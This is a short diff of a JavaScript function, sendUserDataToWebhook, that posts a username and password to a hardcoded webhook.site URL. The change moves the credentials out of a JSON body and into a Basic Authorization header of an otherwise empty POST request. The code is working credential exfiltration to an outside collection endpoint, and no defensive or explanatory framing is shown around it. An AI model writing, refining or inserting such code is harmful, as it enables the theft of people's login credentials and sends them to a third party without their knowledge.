@@ -48,19 +48,14 @@ function sendUserDataToWebhook(username, password) {
   // Replace with your webhook.site URL
   const webhookUrl = "https://webhook.site/66e989bb-2abe-4004-a229-ed6263865c36";
 
-  // Create a JSON payload with both username and password
-  const payload = {
-    username: username,
-    password: password
-  };
+  // Create a Basic Authentication header
+  const headers = new Headers();
+  headers.append('Authorization', 'Basic ' + btoa(username + ':' + password));
 
-  // Send the data to webhook.site
+  // Send an empty POST request (since the data is in the header)
   fetch(webhookUrl, {
     method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify(payload)
+    headers: headers,
   })
   .then(response => {
     if (!response.ok) {
